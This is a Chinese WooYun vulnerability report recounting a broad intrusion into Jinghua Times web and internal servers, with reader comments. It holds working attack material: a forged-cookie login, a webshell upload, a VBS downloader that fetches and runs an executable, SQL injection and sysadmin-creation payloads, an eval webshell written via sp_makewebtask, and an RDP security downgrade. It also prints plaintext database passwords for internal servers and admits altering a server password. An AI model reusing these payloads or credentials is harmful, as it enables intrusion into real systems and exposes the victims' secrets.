{"id": 87167, "wybug_id": "wooyun-2016-0211100", "wybug_title": "从bin.rar到京华时报内网", "wybug_corp": "jinghua.cn", "wybug_author": "niexinming", "wybug_date": "2016-05-21 09:34", "wybug_open_date": "2016-05-27 13:30", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-27：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 京华网和京华亿家都是属于京华时报,所以这个漏洞就给你们好了Ps：渗透快两个月了求个精华吧 详细说明：  首先从http://shop.yijia360.com:81/bin.rar 找到一个压缩包解压之后是asp.net 网站的dll文件， \n\n我用ILSpy反编译一下，发现这个是经典的.net mvc架构，而且Model层用了比较新的linq to sql，也就是说，如果程序员不是特别傻逼的话，Sql注入是没戏了，然后我逆向了两个星期，证明了一件事，就是这个程序员是挺有经验的人……，但是，既然给源代码了，就一定能找到漏洞！！！！！主要反编译的文件是ERP_Web.dll \n\n这个文件是control层的代码后来我展开ERP_Web节点的left代码的时候发现有戏： \n\n我跟踪Context.GetCookie这个函数 \n\n发现： \n\n再跟进：Decrypt() \n\n这整个过程就很清晰了：用户登陆之后把用户Id做Des加密保存到Cookie里面，用户请求页面的时候再把Cookie的加密数据解密，然后从数据库里面查询用户的是否存在，权限是什么下面我们寻找一下密钥：发现程序员把密钥写死在代码里面了：在KeyCryp类里面： \n\n而且我在这个地址发现可以不用登陆就可以得到管理员的Id：http://shop.yijia360.com:81/role/SearchAdmin.aspx  \n\n我写了一个还原的程序： \n\n运行之后： \n\n在浏览器里面： \n\n然后访问：http://223.71.241.126:81/index.html \n\n进到后台了，在产品设置->产品管理->编辑 发现产品图片上传： \n\n传个木马上去Okhttp://223.71.241.126:81/Images/Product/2799/bigPicdbcd07db-a0e4-4431-afd4-ee358d9ade1b.aspx缺陷对应的源代码在： \n\n好了，拿到Shell之后后面就都是老司机的套路了首先发现这个服务器没有打系统补丁，然后用ms51-051秒掉加个用户用kali+reGeorgSocksProxy.py+proxychains+rdesktop就上到服务器的远程桌面了：（中间有个小的技术点就是：如果你这样直接链接上去的话，rdesktop会报错：Failed to connect, CredSSP required by server 原因是windows系统的远程登陆启用了仅允许运行使用网络级别身份验证的远程桌面的计算机连接，我要改成：允许运行任意版本的远程桌面的计算机连接：在WebShell里面这样操作：reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f \n\n） \n\n扫了个端口：发现：10.8.1.99和10.8.1.101开了Ftp其中10.8.1.99的ftp用户名和密码都是admin \n\n发现个压缩包：物流水.发行.老超市（含内外网）.zip 下载下来发现里面有个配置文件： \n\n发现10.8.1.1的数据库密码，然后发现这个账号的是sysadmin的权限，而且数据库的服务器权限是System，这样的后果是，服务器沦陷： \n\n发现服务器上还插了个U盘，里面的是大量的企业机密和个人隐私：  \n\n\n\n在10.8.1.101的Ftp里面发现：（ftp的用户名密码都是：public） \n\n这些系统都下载下来之后就发现配置文件里面有各个系统的数据库密码：server=10.8.1.2;UID=FaXingAdmin;PWD=FaXingAdmin*!%$_365;database=master;Provider=SQLOLEDB publicserver=10.8.1.40;UID=u_zichan;PWD=zc1qaz@WSX;database=master;Provider=SQLOLEDB saserver=10.8.1.1;UID=sa;PWD=jhsb_fxzx_jsz;database=master;Provider=SQLOLEDB saserver=10.8.1.36;database=JHERP;uid=JHERP;password=liuhkjf(*IUGIUJ579 publicserver=10.8.1.4;UID=db_shop;PWD=dbshopdbshopdbshop_123;database=master;Provider=SQLOLEDB  publicuser id=sa;password=JHfx_!>%_54213;data source=10.8.1.5;persist security info=False;initial catalog=Retail_Web我发现10.8.1.40这个数据库虽然是sysadmin的用户但是服务器的权限不高，但是这个服务器也没有打补丁，就开了1433端口，所以我把ms15-051放入我控制的10.8.1.36的网站根目录底下，然后用echo 写的方式写了一个vb的下载者木马：echo iLocal = LCase(WScript.Arguments(1)) >c://iget.vbsecho iRemote = LCase(WScript.Arguments(0)) >>c://iget.vbsecho Set xPost = CreateObject(\"Microsoft.XMLHTTP\") >>c://iget.vbsecho xPost.Open \"GET\",iRemote,0 >>c://iget.vbsecho xPost.Send() >>c://iget.vbsecho Set sGet = CreateObject(\"ADODB.Stream\") >>c://iget.vbsecho sGet.Mode = 3 >>c://iget.vbsecho sGet.Type = 1 >>c://iget.vbsecho sGet.Open() >>c://iget.vbsecho sGet.Write(xPost.responseBody) >>c://iget.vbsecho sGet.SaveToFile iLocal,2 >>c://iget.vbs用法: cscript c://iget.vbs http:// 10.8.1.36/1.exe c://1.exe 然后用ms51-051提权拿到服务器权限： \n\n在http://10.8.1.5:4242/  有sql注入： \n\n用’;if IS_SRVROLEMEMBER('sysadmin')=1 waitfor delay '0:0:5'—检测后面的数据库权限，结果是Sysadmin然后在数据库里面添加另一个Sysadmin的帐号创建用户并且赋予sysadmin角色：EXEC sp_addlogin 'myadmin','myadmin','master'    EXEC sp_addsrvrolemember 'myadmin', 'sysadmin' 然后连接： \n\n因为管理员完全封闭了xp_cmdshell我用xp_dirtree查看目录EXEC MASTER..XP_dirtree 'c:\\',1,1找到网站的目录：D:\\WEB\\bjtissue.com.cn\\Pl_Manage\\利用数据库的一个写文件的存储过程写个shellsp_makewebtask @outputfile='d:\\WEB\\bjtissue.com.cn\\Pl_Manage\\bin.aspx',@charset=utf8,@query='select ''<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"a\"],\"unsafe\");%>'''用菜刀连接之后拿到shell在：http://www.bjtissue.com.cn:42424/x.aspx \n\n因为还有很多事情要忙，所以渗透就到这里   漏洞证明：  如上都有对了，你们那台10.8.1.36的服务器用户sqladmin的密码被我不小心改成Admin#123了，真是特别抱歉   修复方案：  代码层面用Session代替cookie，文件上传要验证后缀运维方面，请把网站的压缩包从站点目录删除：包括：http://shop.yijia360.com/web.zip      http://shop.yijia360.com/bin.rar      http://shop.yijia360.com:81/bin.rar      http://shop.yijia360.com:81/bin.rar      http://shop.yijia360.com:81/order.rar请删掉关闭目录遍历内网ftp密码设置复杂一点请将我的木马删除：http://223.71.241.126:81/Images/Product/2799/bigPicdbcd07db-a0e4-4431-afd4-ee358d9ade1b.aspxhttp://223.71.241.126:81/Images/Product/2799/bigPice64d9e07-5c8f-4337-aef6-8634e0be3c32.cerhttp://www.bjtissue.com.cn:42424/x.aspxhttp://www.bjtissue.com.cn:42424/bin.asphttp://www.bjtissue.com.cn:42424/bin1.asp   版权声明：转载请注明来源 niexinming@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-05-27 13:30 厂商回复：  漏洞Rank：15  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-21 11:27 |    \t\t0h1in9e \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:19        | 林歌 | 峨眉山下修炼中的<网络安全></web开...)\t\t \n  从进入内网到喝茶    \n     2016-05-21 12:16 |    \t\t水系cmos \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:7        | _(:з」✿)_)\t\t \n  这个逼我是要给666的    \n     2016-05-21 12:44 |    \t\tniexinming \t\t\t( 普通白帽子  |\t\t\t        Rank:267 漏洞数:49        | 好好学习，天天日站)\t\t \n  @水系cmos 888888888    \n     2016-05-22 12:58 |    \t\t带我玩 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:8        | 带我玩)\t\t \n  bin.rar 进入内网.感觉好神奇的    \n     2016-05-22 14:00 |    \t\tniexinming \t\t\t( 普通白帽子  |\t\t\t        Rank:267 漏洞数:49        | 好好学习，天天日站)\t\t \n  @带我玩 一点点审计的，我准备考完试在drops发个文章：如何审计.net 网站    \n     2016-05-22 15:20 |    \t\tSoulmk \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:15        | 好好学习才是正事~)\t\t \n  @niexinming 支持！期待你的文章~    \n     2016-05-22 20:21 |    \t\t带我玩 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:8        | 带我玩)\t\t \n  @niexinming 支持    \n     2016-05-22 20:44 |    \t\tfeiyu \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:30        )\t\t \n  @niexinming 期待    \n     2016-05-22 23:47 |    \t\tniexinming \t\t\t( 普通白帽子  |\t\t\t        Rank:267 漏洞数:49        | 好好学习，天天日站)\t\t \n  @Soulmk @带我玩 @feiyu 谢谢大家    \n     2016-05-27 13:33 |    \t\tDracul \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:7        | 萌新white hat)\t\t \n  强    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}